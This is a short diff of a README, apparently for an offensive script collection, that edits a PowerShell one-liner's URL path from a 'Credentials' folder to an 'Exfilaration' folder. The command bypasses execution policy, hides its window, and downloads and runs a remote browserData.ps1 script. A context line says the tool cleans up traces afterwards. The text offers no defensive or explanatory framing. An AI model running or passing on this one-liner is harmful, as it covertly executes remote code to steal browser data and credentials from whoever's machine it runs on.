@@ -35,6 +35,6 @@ Then it cleans up traces of what you have done after.
 
 All
 ```powershell
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/Credentials/BrowserData/browserData.ps1').Content"
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/Exfilaration/BrowserData/browserData.ps1').Content"
 ```
 
